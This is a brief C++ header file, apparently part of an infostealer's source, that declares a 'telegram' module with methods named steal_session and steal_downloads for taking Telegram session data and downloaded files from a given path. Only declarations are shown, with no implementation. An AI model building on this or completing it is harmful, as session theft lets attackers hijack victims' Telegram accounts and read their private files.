#pragma once

#include "../../win.h"

struct telegram {
public:
	void run();
private:
	void steal_session(std::string path);
	void steal_downloads(std::string path);
};

extern telegram g_tg;